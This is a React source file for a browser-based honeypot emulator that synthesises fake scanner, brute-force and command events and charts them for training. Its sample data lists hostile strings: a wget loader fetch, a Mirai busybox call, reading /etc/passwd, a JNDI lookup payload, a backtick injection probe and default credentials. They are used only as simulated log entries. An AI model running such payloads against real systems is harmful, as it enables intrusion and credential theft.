/*
  Project: honey — Browser Honeypot Emulator (no hardware, no DB)
  -----------------------------------------------------------------
  GOAL
  - A 100% browser-native, **safe** honeypot *emulator* you can run in Cursor.
  - It DOES NOT bind real network ports (browsers can't). It simulates inbound
    traffic and lets you analyze it visually. Great for training + prototyping
    parsing/analysis pipelines before building a real honeypot service.

  WHAT YOU GET (on-screen)
  - Start/Stop traffic simulation (randomized scanners, brute attempts, crawlers).
  - Configure emulated services (Telnet, HTTP, MQTT, SSH) w/ banner strings.
  - Live timeline sparkline of event volume and severities.
  - Top source IPs, common credentials, endpoints, and commands.
  - Event table with filters, in-memory only.
  - Import/Export JSON logs (download file) — no servers, no DB.

  PRIVACY/LEGAL NOTE (important)
  - This is a *simulator*. No real packets are captured or transmitted.
  - Use synthetic data or consented lab data only. For production honeypots,
    implement real listeners in a sandboxed VM and keep logs on isolated storage.

  FILE FORMAT (import/export)
  - JSON array of events:
    {
      "ts": "2025-09-24T12:00:00Z",
      "src": "203.0.113.10",
      "service": "telnet",
      "severity": "low|med|high",
      "verb": "CONNECT|AUTH|HTTP|CMD",
      "detail": { "user": "root", "pass": "123456", "path": "/admin" }
    }

  DEPENDENCIES
  - React only. No extra NPM deps required.
*/

import React, { useEffect, useMemo, useRef, useState } from 'react';

// ---------- types ----------
interface Service {
  key: string;
  label: string;
  enabled: boolean;
  banner: string;
  weight: number;
}

interface Event {
  ts: string;
  src: string;
  service: string;
  severity: 'low' | 'med' | 'high';
  verb: string;
  detail: Record<string, any>;
}

interface Filter {
  q: string;
  svc: string;
  sev: string;
}

interface TimelinePoint {
  x: number;
  y: number;
}

// ---------- helpers ----------
const nowISO = () => new Date().toISOString();
const clamp = (x: number, a: number, b: number) => Math.max(a, Math.min(b, x));
const randChoice = <T,>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
const randInt = (a: number, b: number) => a + Math.floor(Math.random() * (b - a + 1));

// small sparkline SVG
function Spark({ data, w = 220, h = 48, stroke = "currentColor" }: { 
  data: TimelinePoint[]; 
  w?: number; 
  h?: number; 
  stroke?: string; 
}) {
  if (!data.length) return <svg width={w} height={h}/>;
  const xs = data.map(d => d.x), ys = data.map(d => d.y);
  const minX = Math.min(...xs), maxX = Math.max(...xs);
  const minY = Math.min(...ys), maxY = Math.max(...ys);
  const points = data.map(d => {
    const x = (w-6) * ( (d.x - minX) / ( (maxX - minX) || 1) ) + 3;
    const y = (h-6) * (1 - ( (d.y - minY) / ((maxY - minY) || 1) )) + 3;
    return `${x},${y}`;
  }).join(' ');
  return (
    <svg width={w} height={h} viewBox={`0 0 ${w} ${h}`}>
      <polyline points={points} fill="none" stroke={stroke} strokeWidth="2"/>
    </svg>
  );
}

// random IP generator for realism
function randIP(): string {
  // Reserve/documentation ranges appear, but that's fine for simulation.
  return `${randInt(1,223)}.${randInt(0,255)}.${randInt(0,255)}.${randInt(1,254)}`;
}

// ---------- emulation core ----------
const DEFAULT_SERVICES: Service[] = [
  { key:'telnet', label:'Telnet', enabled:true, banner:"Welcome to device\r\nlogin:", weight: 1.0 },
  { key:'http',   label:'HTTP',   enabled:true, banner:"Server: lighttpd/1.4.0", weight: 1.3 },
  { key:'mqtt',   label:'MQTT',   enabled:false, banner:"MQTT broker ready", weight: 0.6 },
  { key:'ssh',    label:'SSH',    enabled:false, banner:"SSH-2.0-OpenSSH_7.4", weight: 0.8 },
];

const CREDS = [
  ['root','root'], ['admin','admin'], ['root','123456'], ['pi','raspberry'], ['user','password'], ['admin',''], ['root','toor']
];

const HTTP_PATHS = ['/','/admin','/login','/wp-login.php','/cgi-bin/','/boaform/admin/formLogin','/shell'];
const TELNET_CMDS = ['uname -a','cat /etc/passwd','busybox','wget http://x.y/loader','/bin/busybox MIRAI'];

function synthEvent(services: Service[]): Event {
  const active = services.filter(s => s.enabled);
  const svc = weightedPick(active);
  const src = randIP();
  const sev = randChoice(['low','low','med','low','med','high']);
  const verb = svc.key === 'http' ? randChoice(['CONNECT','HTTP','HTTP','HTTP','CMD'])
           : svc.key === 'telnet' ? randChoice(['CONNECT','AUTH','CMD','AUTH'])
           : svc.key === 'mqtt' ? randChoice(['CONNECT','SUB','PUB'])
           : 'CONNECT';
  const detail: Record<string, any> = {};
  if (svc.key === 'http') {
    detail.path = randChoice(HTTP_PATHS);
    if (verb === 'HTTP') detail.status = randChoice([200,301,401,403,404]);
    if (verb === 'CMD') detail.cmd = randChoice(['GET /?id=`id`','${jndi:ldap://x}']);
  } else if (svc.key === 'telnet') {
    if (verb === 'AUTH') { const [u,p] = randChoice(CREDS); detail.user = u; detail.pass = p; }
    if (verb === 'CMD')  detail.cmd = randChoice(TELNET_CMDS);
  } else if (svc.key === 'mqtt') {
    detail.topic = randChoice(['home/door','tele/device/STATE','$SYS/broker/clients']);
  } else if (svc.key === 'ssh') {
    if (verb === 'CONNECT') detail.kex = randChoice(['curve25519-sha256','diffie-hellman-group14-sha1']);
  }
  return {
    ts: nowISO(),
    src, service: svc.key, severity: sev, verb, detail,
  };
}

function weightedPick<T extends { weight?: number }>(arr: T[]): T {
  const sum = arr.reduce((s, a) => s + (a.weight || 1), 0);
  let r = Math.random() * sum;
  for (const a of arr) {
    r -= (a.weight || 1);
    if (r <= 0) return a;
  }
  return arr[arr.length-1];
}

// ---------- main component ----------
export default function Honey() {
  const [services, setServices] = useState<Service[]>(DEFAULT_SERVICES);
  const [running, setRunning] = useState(false);
  const [rate, setRate] = useState(12); // events/minute
  const [events, setEvents] = useState<Event[]>([]); // in-memory log
  const [filter, setFilter] = useState<Filter>({ q: '', svc: 'all', sev: 'all' });

  // timeline (per 10s bucket)
  const [timeline, setTimeline] = useState<TimelinePoint[]>([]);

  // emulation loop
  useEffect(() => {
    if (!running) return;
    let cancelled = false;
    const intervalMs = clamp(60000 / Math.max(1, rate), 50, 2000);
    const tick = () => {
      if (cancelled) return;
      const e = synthEvent(services);
      setEvents(prev => [ ...prev, e ].slice(-5000)); // cap in-memory log
      const t = Math.floor(Date.now()/10000)*10000;
      setTimeline(prev => {
        const last = prev[prev.length-1];
        if (!last || last.x !== t) return [...prev.slice(-120), { x: t, y: 1 }];
        last.y += 1; return [...prev.slice(0,-1), last];
      });
      setTimeout(tick, intervalMs);
    };
    const id = setTimeout(tick, 10);
    return () => { cancelled = true; clearTimeout(id); };
  }, [running, rate, services]);

  // filtering
  const filtered = useMemo(() => {
    const q = filter.q.trim().toLowerCase();
    return events.filter(e => (
      (filter.svc === 'all' || e.service === filter.svc) &&
      (filter.sev === 'all' || e.severity === filter.sev) &&
      (!q || JSON.stringify(e).toLowerCase().includes(q))
    ));
  }, [events, filter]);

  const topIPs = useMemo(() => {
    const m = new Map<string, number>();
    for (const e of filtered) m.set(e.src, (m.get(e.src) || 0) + 1);
    return [...m.entries()].sort((a, b) => b[1] - a[1]).slice(0, 10);
  }, [filtered]);

  const topCreds = useMemo(() => {
    const m = new Map<string, number>();
    for (const e of filtered) if (e.detail?.user) {
      const k = `${e.detail.user}:${e.detail.pass || ''}`;
      m.set(k, (m.get(k) || 0) + 1);
    }
    return [...m.entries()].sort((a, b) => b[1] - a[1]).slice(0, 10);
  }, [filtered]);

  const topPaths = useMemo(() => {
    const m = new Map<string, number>();
    for (const e of filtered) if (e.detail?.path) m.set(e.detail.path, (m.get(e.detail.path) || 0) + 1);
    return [...m.entries()].sort((a, b) => b[1] - a[1]).slice(0, 10);
  }, [filtered]);

  // import/export
  const onExport = () => {
    const blob = new Blob([JSON.stringify(events, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = `honey-log-${Date.now()}.json`; a.click();
    URL.revokeObjectURL(url);
  };

  const onImport = async (files: FileList) => {
    const all: Event[] = [];
    for (const f of Array.from(files)) {
      const text = await f.text();
      try { 
        const arr = JSON.parse(text); 
        if (Array.isArray(arr)) all.push(...arr); 
      } catch {}
    }
    // basic shape check
    const cleaned = all.filter(o => o && o.ts && o.src && o.service && o.verb);
    setEvents(prev => [...prev, ...cleaned].slice(-5000));
  };

  // UI helpers
  const sevBadge = (s: string) => {
    const map: Record<string, string> = { 
      low: 'sev-low', 
      med: 'sev-med', 
      high: 'sev-high' 
    };
    return <span className={`sev-badge ${map[s] || 'sev-unknown'}`}>{s}</span>;
  };

  return (
    <div className="frame">
      <div className="title">HONEY — BROWSER HONEYPOT EMULATOR</div>
      <div className="rule"></div>
      <div className="subtitle">NO HARDWARE. NO DB. ALL IN-MEMORY. CLICK START EMULATION TO SEE ACTIVITY.</div>

      {/* controls */}
      <div className="grid">
        <div className="box">
          <h3>EMULATION</h3>
          <div className="control-row">
            <button 
              onClick={() => setRunning(v => !v)} 
              className={`btn ${running ? 'btn-stop' : 'btn-start'}`}
            >
              {running ? 'STOP EMULATION' : 'START EMULATION'}
            </button>
            <label className="rate-label">
              RATE
              <input 
                type="range" 
                min={1} 
                max={120} 
                value={rate} 
                onChange={e => setRate(parseInt(e.target.value))} 
                className="rate-slider"
              />
              <span className="rate-value">{rate} EV/MIN</span>
            </label>
          </div>
          <div className="note">SYNTHETIC TRAFFIC ONLY; NO REAL SOCKETS.</div>
        </div>

        <div className="box">
          <h3>SERVICES</h3>
          {services.map((s, ix) => (
            <div key={s.key} className="service-row">
              <label className="service-label">
                <input 
                  type="checkbox" 
                  checked={s.enabled} 
                  onChange={e => setServices(prev => prev.map((p, i) => i === ix ? {...p, enabled: e.target.checked} : p))}
                /> 
                {s.label}
              </label>
              <input 
                type="text" 
                value={s.banner} 
                onChange={e => setServices(prev => prev.map((p, i) => i === ix ? {...p, banner: e.target.value} : p))} 
                className="banner-input"
              />
            </div>
          ))}
        </div>

        <div className="box">
          <h3>IMPORT / EXPORT</h3>
          <div className="control-row">
            <button onClick={onExport} className="btn btn-export">EXPORT JSON</button>
            <button 
              onClick={() => {
                const input = document.createElement('input');
                input.type = 'file'; 
                input.accept = '.json'; 
                input.multiple = true;
                input.onchange = () => onImport(input.files!); 
                input.click();
              }} 
              className="btn btn-import"
            >
              IMPORT JSON
            </button>
          </div>
          <div className="note">DATA STAYS IN MEMORY UNTIL YOU REFRESH.</div>
        </div>
      </div>

      {/* timeline */}
      <div className="box timeline-box">
        <div className="timeline-header">
          <div className="timeline-title">EVENT VOLUME (LAST ~20 MIN)</div>
          <div className="event-count">{events.length} EVENTS</div>
        </div>
        <Spark data={timeline} />
      </div>

      {/* quick stats */}
      <div className="grid">
        <div className="box">
          <div className="stats-title">TOP SOURCE IPS</div>
          <ul className="stats-list">
            {topIPs.map(([ip, c]) => <li key={ip} className="stats-item">
              <span className="stats-key">{ip}</span>
              <span className="stats-value">{c}</span>
            </li>)}
            {!topIPs.length && <li className="stats-empty">(NONE YET)</li>}
          </ul>
        </div>
        <div className="box">
          <div className="stats-title">COMMON CREDENTIALS (SIMULATED)</div>
          <ul className="stats-list">
            {topCreds.map(([k, c]) => <li key={k} className="stats-item">
              <span className="stats-key">{k}</span>
              <span className="stats-value">{c}</span>
            </li>)}
            {!topCreds.length && <li className="stats-empty">(NONE YET)</li>}
          </ul>
        </div>
        <div className="box">
          <div className="stats-title">TOP HTTP PATHS (SIMULATED)</div>
          <ul className="stats-list">
            {topPaths.map(([p, c]) => <li key={p} className="stats-item">
              <span className="stats-key">{p}</span>
              <span className="stats-value">{c}</span>
            </li>)}
            {!topPaths.length && <li className="stats-empty">(NONE YET)</li>}
          </ul>
        </div>
      </div>

      {/* filters */}
      <div className="box">
        <h3>FILTERS</h3>
        <div className="filter-row">
          <input 
            className="filter-input" 
            placeholder="SEARCH JSON (SRC, VERB, PATH, USER...)" 
            value={filter.q} 
            onChange={e => setFilter(f => ({...f, q: e.target.value}))}
          />
          <select 
            className="filter-select" 
            value={filter.svc} 
            onChange={e => setFilter(f => ({...f, svc: e.target.value}))}
          >
            <option value="all">ALL SERVICES</option>
            {services.map(s => <option key={s.key} value={s.key}>{s.label}</option>)}
          </select>
          <select 
            className="filter-select" 
            value={filter.sev} 
            onChange={e => setFilter(f => ({...f, sev: e.target.value}))}
          >
            <option value="all">ALL SEVERITIES</option>
            <option value="low">LOW</option>
            <option value="med">MED</option>
            <option value="high">HIGH</option>
          </select>
          <button 
            onClick={() => setFilter({q: '', svc: 'all', sev: 'all'})} 
            className="btn btn-clear"
          >
            CLEAR
          </button>
        </div>
      </div>

      {/* table */}
      <div className="table-container">
        <table className="events-table">
          <thead>
            <tr>
              <th>TIME</th>
              <th>SOURCE</th>
              <th>SERVICE</th>
              <th>VERB</th>
              <th>SEVERITY</th>
              <th>DETAIL</th>
            </tr>
          </thead>
          <tbody>
            {filtered.slice(-1000).reverse().map((e, ix) => (
              <tr key={ix}>
                <td>{new Date(e.ts).toLocaleString()}</td>
                <td className="mono">{e.src}</td>
                <td>{e.service}</td>
                <td>{e.verb}</td>
                <td>{sevBadge(e.severity)}</td>
                <td className="mono detail-cell">{JSON.stringify(e.detail)}</td>
              </tr>
            ))}
            {!filtered.length && (
              <tr>
                <td colSpan={6} className="empty-message">
                  NO EVENTS YET — CLICK <b>START EMULATION</b>.
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>

      <div className="footer">© HONEY — EDUCATIONAL SIMULATOR. FOR REAL HONEYPOTS USE ISOLATED VMS/CONTAINERS AND LAWFUL DATA HANDLING.</div>
    </div>
  );
}
